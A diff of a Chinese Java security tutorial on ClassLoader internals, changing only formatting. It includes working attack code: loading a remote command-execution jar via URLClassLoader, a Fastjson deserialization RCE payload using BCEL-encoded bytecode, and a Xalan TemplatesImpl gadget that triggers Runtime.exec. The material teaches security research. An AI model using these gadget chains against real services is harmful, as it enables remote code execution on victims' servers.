@@ -4,7 +4,7 @@ Java是一个依赖于`JVM`（Java虚拟机）实现的跨平台的开发语言�
 
 **JVM架构图：**
 
-<img src="https://oss.javasec.org/images/JvmSpec7.png" alt="JVM"  />
+![img](https://oss.javasec.org/images/JvmSpec7.png)
 
 
 
@@ -23,9 +23,9 @@ package com.anbai.sec.classloader;
  */
 public class TestHelloWorld {
 
-	public String hello() {
-		return "Hello World~";
-	}
+    public String hello() {
+        return "Hello World~";
+    }
 
 }
 ```
@@ -34,7 +34,7 @@ public class TestHelloWorld {
 
 我们可以通过JDK自带的`javap`命令反汇编`TestHelloWorld.class`文件对应的`com.anbai.sec.classloader.TestHelloWorld`类，以及使用Linux自带的`hexdump`命令查看`TestHelloWorld.class`文件二进制内容：
 
-<img src="https://oss.javasec.org/images/image-20191217171821663.png" alt="image-20191217171821663"  />
+![img](https://oss.javasec.org/images/image-20191217171821663.png)
 
 JVM在执行`TestHelloWorld`之前会先解析class二进制内容，JVM执行的其实就是如上`javap`命令生成的字节码。
 
@@ -67,7 +67,7 @@ Java类加载方式分为`显式`和`隐式`,`显式`即我们通常使用`Java�
 Class.forName("com.anbai.sec.classloader.TestHelloWorld");
 
 // ClassLoader加载TestHelloWorld示例
-this.getClass().getClassLoader().loadClass("com.anbai.sec.classloader.TestHelloWorld");
+        this.getClass().getClassLoader().loadClass("com.anbai.sec.classloader.TestHelloWorld");
 ```
 
 `Class.forName("类名")`默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用`Class.forName("类名", 是否初始化类, 类加载器)`，而`ClassLoader.loadClass`默认不会初始化类方法。
@@ -100,8 +100,8 @@ this.getClass().getClassLoader().loadClass("com.anbai.sec.classloader.TestHelloW
 
 ```java
 TestHelloWorld t = new TestHelloWorld();
-String str = t.hello();
-System.out.println(str);
+        String str = t.hello();
+        System.out.println(str);
 ```
 
 但是如果`com.anbai.sec.classloader.TestHelloWorld`根本就不存在于我们的`classpath`，那么我们可以使用自定义类加载器重写`findClass`方法，然后在调用`defineClass`方法的时候传入`TestHelloWorld`类的字节码的方式来向JVM中定义一个`TestHelloWorld`类，最后通过反射机制就可以调用`TestHelloWorld`类的`hello`方法了。
@@ -119,61 +119,61 @@ import java.lang.reflect.Method;
  */
 public class TestClassLoader extends ClassLoader {
 
-	// TestHelloWorld类名
-	private static String testClassName = "com.anbai.sec.classloader.TestHelloWorld";
+    // TestHelloWorld类名
+    private static String testClassName = "com.anbai.sec.classloader.TestHelloWorld";
 
-	// TestHelloWorld类字节码
-	private static byte[] testClassBytes = new byte[]{
-			-54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,
-			16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,
-			101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,
-			1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,
-			97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,
-			101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,
-			114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,
-			32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,
-			115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,
-			116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,
-			97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,
-			0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,
-			1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,
-			0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,
-			0, 0, 0, 2, 0, 12
-	};
+    // TestHelloWorld类字节码
+    private static byte[] testClassBytes = new byte[]{
+            -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,
+            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,
+            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,
+            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,
+            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,
+            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,
+            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,
+            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,
+            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,
+            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,
+            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,
+            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,
+            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,
+            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,
+            0, 0, 0, 2, 0, 12
+    };
 
-	@Override
-	public Class<?> findClass(String name) throws ClassNotFoundException {
-		// 只处理TestHelloWorld类
-		if (name.equals(testClassName)) {
-			// 调用JVM的native方法定义TestHelloWorld类
-			return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
-		}
+    @Override
+    public Class<?> findClass(String name) throws ClassNotFoundException {
+        // 只处理TestHelloWorld类
+        if (name.equals(testClassName)) {
+            // 调用JVM的native方法定义TestHelloWorld类
+            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
+        }
 
-		return super.findClass(name);
-	}
+        return super.findClass(name);
+    }
 
-	public static void main(String[] args) {
-		// 创建自定义的类加载器
-		TestClassLoader loader = new TestClassLoader();
+    public static void main(String[] args) {
+        // 创建自定义的类加载器
+        TestClassLoader loader = new TestClassLoader();
 
-		try {
-			// 使用自定义的类加载器加载TestHelloWorld类
-			Class testClass = loader.loadClass(testClassName);
+        try {
+            // 使用自定义的类加载器加载TestHelloWorld类
+            Class testClass = loader.loadClass(testClassName);
 
-			// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();
-			Object testInstance = testClass.newInstance();
+            // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();
+            Object testInstance = testClass.newInstance();
 
-			// 反射获取hello方法
-			Method method = testInstance.getClass().getMethod("hello");
+            // 反射获取hello方法
+            Method method = testInstance.getClass().getMethod("hello");
 
-			// 反射调用hello方法,等价于 String str = t.hello();
-			String str = (String) method.invoke(testInstance);
+            // 反射调用hello方法,等价于 String str = t.hello();
+            String str = (String) method.invoke(testInstance);
 
-			System.out.println(str);
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
+            System.out.println(str);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
 }
 ```
@@ -202,40 +202,40 @@ import java.net.URLClassLoader;
  */
 public class TestURLClassLoader {
 
-	public static void main(String[] args) {
-		try {
-			// 定义远程加载的jar路径
-			URL url = new URL("https://anbai.io/tools/cmd.jar");
+    public static void main(String[] args) {
+        try {
+            // 定义远程加载的jar路径
+            URL url = new URL("https://anbai.io/tools/cmd.jar");
 
-			// 创建URLClassLoader对象，并加载远程jar包
-			URLClassLoader ucl = new URLClassLoader(new URL[]{url});
+            // 创建URLClassLoader对象，并加载远程jar包
+            URLClassLoader ucl = new URLClassLoader(new URL[]{url});
 
-			// 定义需要执行的系统命令
-			String cmd = "ls";
+            // 定义需要执行的系统命令
+            String cmd = "ls";
 
-			// 通过URLClassLoader加载远程jar包中的CMD类
-			Class cmdClass = ucl.loadClass("CMD");
+            // 通过URLClassLoader加载远程jar包中的CMD类
+            Class cmdClass = ucl.loadClass("CMD");
 
-			// 调用CMD类中的exec方法，等价于: Process process = CMD.exec("whoami");
-			Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);
+            // 调用CMD类中的exec方法，等价于: Process process = CMD.exec("whoami");
+            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);
 
-			// 获取命令执行结果的输入流
-			InputStream           in   = process.getInputStream();
-			ByteArrayOutputStream baos = new ByteArrayOutputStream();
-			byte[]                b    = new byte[1024];
-			int                   a    = -1;
+            // 获取命令执行结果的输入流
+            InputStream           in   = process.getInputStream();
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            byte[]                b    = new byte[1024];
+            int                   a    = -1;
 
-			// 读取命令执行结果
-			while ((a = in.read(b)) != -1) {
-				baos.write(b, 0, a);
-			}
+            // 读取命令执行结果
+            while ((a = in.read(b)) != -1) {
+                baos.write(b, 0, a);
+            }
 
-			// 输出命令执行结果
-			System.out.println(baos.toString());
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
+            // 输出命令执行结果
+            System.out.println(baos.toString());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
 }
 ```
@@ -251,9 +251,9 @@ import java.io.IOException;
  */
 public class CMD {
 
-	public static Process exec(String cmd) throws IOException {
-		return Runtime.getRuntime().exec(cmd);
-	}
+    public static Process exec(String cmd) throws IOException {
+        return Runtime.getRuntime().exec(cmd);
+    }
 
 }
 ```
@@ -262,11 +262,11 @@ public class CMD {
 
 ```java
 README.md
-gitbook
-javaweb-sec-source
-javaweb-sec.iml
-jni
-pom.xml
+        gitbook
+        javaweb-sec-source
+        javaweb-sec.iml
+        jni
+        pom.xml
 ```
 
 
@@ -275,7 +275,7 @@ pom.xml
 
 创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。
 
-<img src="https://oss.javasec.org/images/202110251829223.png" alt="image-20211025171150475"  />
+![img](https://oss.javasec.org/images/202110251829223.png)
 
 
 
@@ -295,71 +295,71 @@ import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_NAME;
 
 public class TestCrossClassLoader {
 
-   public static class ClassLoaderA extends ClassLoader {
+    public static class ClassLoaderA extends ClassLoader {
 
-      public ClassLoaderA(ClassLoader parent) {
-         super(parent);
-      }
+        public ClassLoaderA(ClassLoader parent) {
+            super(parent);
+        }
 
-      {
-         // 加载类字节码
-         defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
-      }
+        {
+            // 加载类字节码
+            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
+        }
 
-   }
+    }
 
-   public static class ClassLoaderB extends ClassLoader {
+    public static class ClassLoaderB extends ClassLoader {
 
-      public ClassLoaderB(ClassLoader parent) {
-         super(parent);
-      }
+        public ClassLoaderB(ClassLoader parent) {
+            super(parent);
+        }
 
-      {
-         // 加载类字节码
-         defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
-      }
+        {
+            // 加载类字节码
+            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
+        }
 
-   }
+    }
 
-   public static void main(String[] args) throws Exception {
-      // 父类加载器
-      ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();
+    public static void main(String[] args) throws Exception {
+        // 父类加载器
+        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();
 
-      // A类加载器
-      ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);
+        // A类加载器
+        ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);
 
-      // B类加载器
-      ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);
+        // B类加载器
+        ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);
 
-      // 使用A/B类加载器加载同一个类
-      Class<?> aClass  = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
-      Class<?> aaClass = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
-      Class<?> bClass  = Class.forName(TEST_CLASS_NAME, true, bClassLoader);
+        // 使用A/B类加载器加载同一个类
+        Class<?> aClass  = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
+        Class<?> aaClass = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
+        Class<?> bClass  = Class.forName(TEST_CLASS_NAME, true, bClassLoader);
 
-      // 比较A类加载和B类加载器加载的类是否相等
-      System.out.println("aClass == aaClass：" + (aClass == aaClass));
-      System.out.println("aClass == bClass：" + (aClass == bClass));
+        // 比较A类加载和B类加载器加载的类是否相等
+        System.out.println("aClass == aaClass：" + (aClass == aaClass));
+        System.out.println("aClass == bClass：" + (aClass == bClass));
 
-      System.out.println("\n" + aClass.getName() + "方法清单：");
+        System.out.println("\n" + aClass.getName() + "方法清单：");
 
-      // 获取该类所有方法
-      Method[] methods = aClass.getDeclaredMethods();
+        // 获取该类所有方法
+        Method[] methods = aClass.getDeclaredMethods();
 
-      for (Method method : methods) {
-         System.out.println(method);
-      }
+        for (Method method : methods) {
+            System.out.println(method);
+        }
 
-      // 创建类实例
-      Object instanceA = aClass.newInstance();
+        // 创建类实例
+        Object instanceA = aClass.newInstance();
 
-      // 获取hello方法
-      Method helloMethod = aClass.getMethod("hello");
+        // 获取hello方法
+        Method helloMethod = aClass.getMethod("hello");
 
-      // 调用hello方法
-      String result = (String) helloMethod.invoke(instanceA);
+        // 调用hello方法
+        String result = (String) helloMethod.invoke(instanceA);
 
-      System.out.println("\n反射调用：" + TEST_CLASS_NAME + "类" + helloMethod.getName() + "方法，返回结果：" + result);
-   }
+        System.out.println("\n反射调用：" + TEST_CLASS_NAME + "类" + helloMethod.getName() + "方法，返回结果：" + result);
+    }
 
 }
 ```
@@ -368,12 +368,12 @@ public class TestCrossClassLoader {
 
 ```java
 aClass == aaClass：true
-aClass == bClass：false
+        aClass == bClass：false
 
-com.anbai.sec.classloader.TestHelloWorld方法清单：
+        com.anbai.sec.classloader.TestHelloWorld方法清单：
 public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()
 
-反射调用：com.anbai.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~
+        反射调用：com.anbai.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~
 ```
 
 
@@ -411,7 +411,7 @@ public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()
 
 **示例 - 冰蝎命令执行类反编译：**
 
-<img src="https://oss.javasec.org/images/202110251849324.png" alt="image-20211025184759248"  />
+![img](https://oss.javasec.org/images/202110251849324.png)
 
 
 
@@ -427,7 +427,7 @@ public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()
 
 **示例 - BCEL类名解码：**
 
-<img src="https://oss.javasec.org/images/202110251829177.png" alt="image-20211021104833683"  />
+![img](https://oss.javasec.org/images/202110251829177.png)
 
 
 
@@ -439,7 +439,7 @@ public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()
 private static final byte[] CLASS_BYTES = new byte[]{类字节码byte数组}];
 
 // BCEL编码类字节码
-String className = "$$BCEL$$" + com.sun.org.apache.bcel.internal.classfile.Utility.encode(CLASS_BYTES, true);
+        String className = "$$BCEL$$" + com.sun.org.apache.bcel.internal.classfile.Utility.encode(CLASS_BYTES, true);
 ```
 
 编码后的类名：`$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbn$d......`，BCEL会对类字节码进行编码，
@@ -448,10 +448,10 @@ String className = "$$BCEL$$" + com.sun.org.apache.bcel.internal.classfile.Utili
 
 ```java
 int    index    = className.indexOf("$$BCEL$$");
-String realName = className.substring(index + 8);
+        String realName = className.substring(index + 8);
 
 // BCEL解码类字节码
-byte[] bytes = com.sun.org.apache.bcel.internal.classfile.Utility.decode(realName, true);
+        byte[] bytes = com.sun.org.apache.bcel.internal.classfile.Utility.decode(realName, true);
 ```
 
 如果被加载的类名中包含了`$$BCEL$$`关键字，BCEL就会使用特殊的方式进行解码并加载解码之后的类。
@@ -464,13 +464,13 @@ BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始`org.apache.bcel.
 
 ```java
 /**
-* @param bytes the raw bytes of this Utf-8
-* @deprecated (since 6.0)
-*/
+ * @param bytes the raw bytes of this Utf-8
+ * @deprecated (since 6.0)
+ */
 @java.lang.Deprecated
 public final void setBytes( final String bytes ) {
-  throw new UnsupportedOperationException();
-}
+        throw new UnsupportedOperationException();
+        }
 ```
 
 Oracle自带的BCEL是修改了原始的包名，因此也有兼容性问题，已知支持该特性的JDK版本为：`JDK1.5 - 1.7`、`JDK8 - JDK8u241`、`JDK9`。
@@ -496,22 +496,22 @@ import java.io.IOException;
 
 public class TestBCELClass {
 
-	static {
-		String command = "open -a Calculator.app";
-		String osName  = System.getProperty("os.name");
+    static {
+        String command = "open -a Calculator.app";
+        String osName  = System.getProperty("os.name");
 
-		if (osName.startsWith("Windows")) {
-			command = "calc 12345678901234567";
-		} else if (osName.startsWith("Linux")) {
-			command = "curl localhost:9999/";
-		}
+        if (osName.startsWith("Windows")) {
+            command = "calc 12345678901234567";
+        } else if (osName.startsWith("Linux")) {
+            command = "curl localhost:9999/";
+        }
 
-		try {
-			Runtime.getRuntime().exec(command);
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-	}
+        try {
+            Runtime.getRuntime().exec(command);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
 
 }
 ```
@@ -520,22 +520,22 @@ public class TestBCELClass {
 
 ```java
 /**
-* 将一个Class文件编码成BCEL类
-*
-* @param classFile Class文件路径
-* @return 编码后的BCEL类
-* @throws IOException 文件读取异常
-*/
+ * 将一个Class文件编码成BCEL类
+ *
+ * @param classFile Class文件路径
+ * @return 编码后的BCEL类
+ * @throws IOException 文件读取异常
+ */
 public static String bcelEncode(File classFile) throws IOException {
-	return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
-}
+        return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
+        }
 ```
 
 从JSON反序列化实现来看，只是注入了类名和类加载器并不足以触发类加载，导致命令执行的关键问题就在于FastJson会自动调用getter方法，`org.apache.commons.dbcp.BasicDataSource`本没有`connection`成员变量，但有一个`getConnection()`方法，按理来讲应该不会调用`getConnection()`方法，但是FastJson会通过`getConnection()`这个方法名计算出一个名为`connection`的field，详情参见：[com.alibaba.fastjson.util.TypeUtils#computeGetters](https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904)，因此FastJson最终还是调用了`getConnection()`方法。
 
 当`getConnection()`方法被调用时就会使用注入进来的`org.apache.bcel.util.ClassLoader`类加载器加载注入进来恶意类字节码，如下图：
 
-<img src="https://oss.javasec.org/images/202110251829173.png" alt="image-20211025163659065"  />
+![img](https://oss.javasec.org/images/202110251829173.png)
 
 因为使用了反射的方式加载`com.anbai.sec.classloader.TestBCELClass`类，而且还特意指定了需要初始化类（`Class.forName(driverClassName, true, driverClassLoader);`），因此该类的静态语句块（`static{...}`）将会被执行，完整的攻击示例代码如下：
 
@@ -555,79 +555,79 @@ import java.util.Map;
 
 public class BCELClassLoader {
 
-	/**
-	 * com.anbai.sec.classloader.TestBCELClass类字节码，Windows和MacOS弹计算器，Linux执行curl localhost:9999
-	 * </pre>
-	 */
-	private static final byte[] CLASS_BYTES = new byte[]{
-			-54, -2, -70, -66, 0, 0, 0, 50, 0, // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/BCELClassLoader.java
-	};
+    /**
+     * com.anbai.sec.classloader.TestBCELClass类字节码，Windows和MacOS弹计算器，Linux执行curl localhost:9999
+     * </pre>
+     */
+    private static final byte[] CLASS_BYTES = new byte[]{
+            -54, -2, -70, -66, 0, 0, 0, 50, 0, // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/BCELClassLoader.java
+    };
 
-  /**
-	 * 将一个Class文件编码成BCEL类
-	 *
-	 * @param classFile Class文件路径
-	 * @return 编码后的BCEL类
-	 * @throws IOException 文件读取异常
-	 */
-	public static String bcelEncode(File classFile) throws IOException {
-		return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
-	}
-  
-	/**
-	 * BCEL命令执行示例，测试时请注意兼容性问题：① 适用于BCEL 6.0以下。② JDK版本为：JDK1.5 - 1.7、JDK8 - JDK8u241、JDK9
-	 *
-	 * @throws Exception 类加载异常
-	 */
-	public static void bcelTest() throws Exception {
-		// 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类
-//		Class<?> bcelClass = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
+    /**
+     * 将一个Class文件编码成BCEL类
+     *
+     * @param classFile Class文件路径
+     * @return 编码后的BCEL类
+     * @throws IOException 文件读取异常
+     */
+    public static String bcelEncode(File classFile) throws IOException {
+        return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
+    }
 
-		// 创建BCEL类加载器
-//			ClassLoader classLoader = (ClassLoader) bcelClass.newInstance();
-//			ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();
-		ClassLoader classLoader = new org.apache.bcel.util.ClassLoader();
+    /**
+     * BCEL命令执行示例，测试时请注意兼容性问题：① 适用于BCEL 6.0以下。② JDK版本为：JDK1.5 - 1.7、JDK8 - JDK8u241、JDK9
+     *
+     * @throws Exception 类加载异常
+     */
+    public static void bcelTest() throws Exception {
+        // 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类
+//      Class<?> bcelClass = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
 
-		// BCEL编码类字节码
-		String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
+        // 创建BCEL类加载器
+//          ClassLoader classLoader = (ClassLoader) bcelClass.newInstance();
+//          ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();
+        ClassLoader classLoader = new org.apache.bcel.util.ClassLoader();
 
-		System.out.println(className);
+        // BCEL编码类字节码
+        String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
 
-		Class<?> clazz = Class.forName(className, true, classLoader);
+        System.out.println(className);
 
-		System.out.println(clazz);
-	}
+        Class<?> clazz = Class.forName(className, true, classLoader);
 
-	/**
-	 * Fastjson 1.1.15 - 1.2.4 反序列化RCE示例，示例程序考虑到测试环境的兼容性，采用的都是Apache commons dbcp和bcel
-	 *
-	 * @throws IOException BCEL编码异常
-	 */
-	public static void fastjsonRCE() throws IOException {
-		// BCEL编码类字节码
-		String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
+        System.out.println(clazz);
+    }
 
-		// 构建恶意的JSON
-		Map<String, Object> dataMap        = new LinkedHashMap<String, Object>();
-		Map<String, Object> classLoaderMap = new LinkedHashMap<String, Object>();
+    /**
+     * Fastjson 1.1.15 - 1.2.4 反序列化RCE示例，示例程序考虑到测试环境的兼容性，采用的都是Apache commons dbcp和bcel
+     *
+     * @throws IOException BCEL编码异常
+     */
+    public static void fastjsonRCE() throws IOException {
+        // BCEL编码类字节码
+        String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
 
-		dataMap.put("@type", BasicDataSource.class.getName());
-		dataMap.put("driverClassName", className);
+        // 构建恶意的JSON
+        Map<String, Object> dataMap        = new LinkedHashMap<String, Object>();
+        Map<String, Object> classLoaderMap = new LinkedHashMap<String, Object>();
 
-		classLoaderMap.put("@type", org.apache.bcel.util.ClassLoader.class.getName());
-		dataMap.put("driverClassLoader", classLoaderMap);
+        dataMap.put("@type", BasicDataSource.class.getName());
+        dataMap.put("driverClassName", className);
 
-		String json = JSON.toJSONString(dataMap);
-		System.out.println(json);
+        classLoaderMap.put("@type", org.apache.bcel.util.ClassLoader.class.getName());
+        dataMap.put("driverClassLoader", classLoaderMap);
 
-		JSONObject jsonObject = JSON.parseObject(json);
-		System.out.println(jsonObject);
-	}
+        String json = JSON.toJSONString(dataMap);
+        System.out.println(json);
 
-	public static void main(String[] args) throws Exception {
-//		bcelTest();
-		fastjsonRCE();
-	}
+        JSONObject jsonObject = JSON.parseObject(json);
+        System.out.println(jsonObject);
+    }
+
+    public static void main(String[] args) throws Exception {
+//      bcelTest();
+        fastjsonRCE();
+    }
 
 }
 ```
@@ -642,7 +642,7 @@ Xalan和BCEL一样都经常被用于编写反序列化Payload，Oracle JDK默认
 
 **TemplatesImpl类：**
 
-<img src="https://oss.javasec.org/images/202110251829988.png" alt="image-20211021195637540"  />
+![img](https://oss.javasec.org/images/202110251829988.png)
 
 **Xalan攻击示例代码：**
 
@@ -665,100 +665,100 @@ import static org.apache.commons.codec.binary.Base64.encodeBase64String;
 
 public class XalanTemplatesImpl {
 
-	/**
-	 * com.anbai.sec.classloader.TestAbstractTranslet类字节码
-	 */
-	public static final byte[] CLASS_BYTES = new byte[]{
-			-54, -2, -70, -66 // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/XalanTemplatesImpl.java
-	};
+    /**
+     * com.anbai.sec.classloader.TestAbstractTranslet类字节码
+     */
+    public static final byte[] CLASS_BYTES = new byte[]{
+            -54, -2, -70, -66 // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/XalanTemplatesImpl.java
+    };
 
-	/**
-	 * 使用反射修改TemplatesImpl类的成员变量方式触发命令执行，Jackson和Fastjson采用这种方式触发RCE
-	 *
-	 * @throws Exception 调用异常
-	 */
-	public static void invokeField() throws Exception {
-		TemplatesImpl template      = new TemplatesImpl();
-		Class<?>      templateClass = template.getClass();
+    /**
+     * 使用反射修改TemplatesImpl类的成员变量方式触发命令执行，Jackson和Fastjson采用这种方式触发RCE
+     *
+     * @throws Exception 调用异常
+     */
+    public static void invokeField() throws Exception {
+        TemplatesImpl template      = new TemplatesImpl();
+        Class<?>      templateClass = template.getClass();
 
-		// 获取需要修改的成员变量
-		Field byteCodesField        = templateClass.getDeclaredField("_bytecodes");
-		Field nameField             = templateClass.getDeclaredField("_name");
-		Field tFactoryField         = templateClass.getDeclaredField("_tfactory");
-		Field outputPropertiesField = templateClass.getDeclaredField("_outputProperties");
+        // 获取需要修改的成员变量
+        Field byteCodesField        = templateClass.getDeclaredField("_bytecodes");
+        Field nameField             = templateClass.getDeclaredField("_name");
+        Field tFactoryField         = templateClass.getDeclaredField("_tfactory");
+        Field outputPropertiesField = templateClass.getDeclaredField("_outputProperties");
 
-		// 修改成员属性访问权限
-		byteCodesField.setAccessible(true);
-		nameField.setAccessible(true);
-		tFactoryField.setAccessible(true);
-		outputPropertiesField.setAccessible(true);
+        // 修改成员属性访问权限
+        byteCodesField.setAccessible(true);
+        nameField.setAccessible(true);
+        tFactoryField.setAccessible(true);
+        outputPropertiesField.setAccessible(true);
 
-		// 设置类字节码
-		byteCodesField.set(template, new byte[][]{CLASS_BYTES});
+        // 设置类字节码
+        byteCodesField.set(template, new byte[][]{CLASS_BYTES});
 
-		// 设置名称
-		nameField.set(template, "");
+        // 设置名称
+        nameField.set(template, "");
 
-		// 设置TransformerFactoryImpl实例
-		tFactoryField.set(template, new TransformerFactoryImpl());
+        // 设置TransformerFactoryImpl实例
+        tFactoryField.set(template, new TransformerFactoryImpl());
 
-		// 设置Properties配置
-		outputPropertiesField.set(template, new Properties());
+        // 设置Properties配置
+        outputPropertiesField.set(template, new Properties());
 
-		// 触发defineClass调用链：
-		//   getOutputProperties->newTransformer->getTransletInstance->defineTransletClasses->defineClass
-		// 触发命令执行调用链：
-		//   getOutputProperties->newTransformer->getTransletInstance->new TestAbstractTranslet->Runtime#exec
-		template.getOutputProperties();
-	}
+        // 触发defineClass调用链：
+        //   getOutputProperties->newTransformer->getTransletInstance->defineTransletClasses->defineClass
+        // 触发命令执行调用链：
+        //   getOutputProperties->newTransformer->getTransletInstance->new TestAbstractTranslet->Runtime#exec
+        template.getOutputProperties();
+    }
 
-	/**
-	 * 使用反射调用TemplatesImpl类的私有构造方法方式触发命令执行
-	 *
